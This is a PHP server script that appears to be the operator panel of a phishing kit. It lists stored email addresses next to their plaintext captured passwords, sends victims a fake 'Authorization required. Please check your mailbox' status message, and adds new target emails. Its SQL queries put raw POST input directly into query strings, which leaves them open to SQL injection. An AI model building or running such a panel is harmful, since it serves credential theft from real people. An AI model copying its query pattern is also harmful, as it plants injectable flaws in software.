<?php
session_start();
require("../../config/db_connect.php");
if ( isset($_POST["row_counter"]) ) {
	$query = $conn->prepare("SELECT * FROM user_login");
	try {
		$query->execute();
		$row = $query->fetchAll();
		echo json_encode($row);
	}catch(PDOEXception $e) {
		echo $e->getMessage();	
	}
}

if ( isset($_POST["fetch_table"]) ) {
	$query = $conn->prepare("SELECT * FROM user_login ORDER BY id DESC");
	try {
		$query->execute();
		if ( $query->rowcount() > 0 ) {
			?>
				<h4>Request table</h4>
				<div class="table-responsive">
					<table class="table table-hover">
						<thead class="bg-info">
							<tr>
								<th>#</th>
								<th>Email hash</th>
								<th>Email</th>
								<th>Password</th>
								<th>Action</th>
							</tr>
						</thead>
						<tbody>
			<?php
			$x = 1;
			while ( $row = $query->fetch() ) {
				?>
					<tr>
						<td><?php echo $x ?></td>
						<td><?php echo $row['email_hash']; ?></td>
						<td><?php echo $row['email']; ?></td>
						<td><?php echo $row['login_pwd']; ?></td>
						<td>
							<form action="javascript:void(0)" class="authform" onsubmit="sendAuth(this)" id="form<?php echo $row['id']; ?>">
								<input type="text" name="feed" value="Authorization required. Please check your mailbox">
								<input type="hidden" name="email_hash" value="<?php echo $row['email_hash']; ?>">
								<button type="submit" class="btn btn-xs btn-primary">Submit</button>
							</form>
						</td>
					</tr>
				<?php
				$x++;
			}
			?>
						</tbody>
					</table>
				</div>
			<?php
		}else {
			echo "<p class='text-center'>No record found!</p>";
		}
	}catch(PDOEXception $e) {
		echo $e->getMessage();	
	}
}


if ( isset($_POST["email_hash"]) ) {
	$email_hash = $_POST["email_hash"];
	$feed = $_POST["feed"];
  $query = $conn->prepare("UPDATE user_login SET status='$feed' WHERE email_hash='$email_hash'");
	try {
		$query->execute();
		echo "request Sent!";
	}catch( PDOException $e ) {
		echo $e->getMessage();
	}
}


if ( isset($_POST["add_record"]) ) {
	$email = $_POST["email"];
	$email_hash = md5($email);
	
	$check = $conn->prepare("SELECT * FROM user_login WHERE email = '$email'");
	$check->execute();
	if ( $check->rowcount() > 0 )
		echo "Email already added";
	else {
		$query = $conn->prepare("INSERT INTO user_login(email_hash, email, login_pwd, status, created_at)
			VALUES('$email_hash', '$email', '', '', now())");
		try {
			$query->execute();
			echo "Record added!";
		}catch( PDOException $e ) {
			echo $e->getMessage();
		}
	}
}
?>